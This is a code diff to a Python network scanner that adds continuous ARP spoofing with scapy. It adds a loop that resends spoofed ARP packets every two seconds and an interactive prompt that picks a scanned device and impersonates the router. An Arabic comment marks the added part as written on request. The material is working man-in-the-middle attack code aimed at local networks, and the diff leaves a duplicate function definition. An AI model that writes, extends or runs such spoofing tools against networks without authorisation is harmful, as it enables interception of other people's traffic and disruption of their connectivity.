@@ -4,8 +4,20 @@ import socket
 import ipaddress
 import uuid
 from concurrent.futures import ThreadPoolExecutor, as_completed
-
 from scapy.all import ARP, send
+import time
+
+def continuously_spoof(target_ip, spoof_ip, interval=2):
+    """
+    Continuously send ARP spoofing packets every 'interval' seconds.
+    """
+    try:
+        while True:
+            perform_arp_spoof(target_ip, spoof_ip)
+            time.sleep(interval)
+    except KeyboardInterrupt:
+        print(f"{Colors.WARNING}\n[!] Stopping continuous ARP spoofing.{Colors.ENDC}")
+
 
 
 class Colors:
@@ -459,6 +471,45 @@ def prompt_for_spoof(online_devices):
     router_ip = input("Enter router IP to spoof (default 192.168.1.1): ").strip() or "192.168.1.1"
 
     perform_arp_spoof(target_ip=target_ip, spoof_ip=router_ip)
+
+
+
+def prompt_for_spoof(online_devices):
+    if not online_devices:
+        print(f"{Colors.WARNING}No online devices available for spoofing. Run a scan first.{Colors.ENDC}\n")
+        return
+
+    print(f"{Colors.OKBLUE}Select a target for ARP spoofing:{Colors.ENDC}")
+    for idx, device in enumerate(online_devices, start=1):
+        print(
+            f"{Colors.OKCYAN}{idx}. IP: {device['ip']}, MAC: {device['mac']}, "
+            f"Device: {device['device_type']}{Colors.ENDC}"
+        )
+
+    try:
+        target_idx = int(input("Enter the device number: "))
+    except ValueError:
+        print(f"{Colors.FAIL}Invalid selection. Please enter a number.{Colors.ENDC}\n")
+        return
+
+    if not 1 <= target_idx <= len(online_devices):
+        print(f"{Colors.FAIL}Selection out of range.{Colors.ENDC}\n")
+        return
+
+    target_device = online_devices[target_idx - 1]
+    target_ip = target_device["ip"]
+    router_ip = input("Enter router IP to spoof (default 192.168.1.1): ").strip() or "192.168.1.1"
+
+    # --------------------------
+    #  ❗ هنا تضع الجزء الذي طلبته
+    # --------------------------
+    mode = input("Continuous spoof? (y/n): ").strip().lower()
+
+    if mode == "y":
+        print(f"{Colors.WARNING}Starting continuous spoofing... Press CTRL+C to stop.{Colors.ENDC}")
+        continuously_spoof(target_ip, router_ip)
+    else:
+        perform_arp_spoof(target_ip, router_ip)
 
 
 def print_menu():
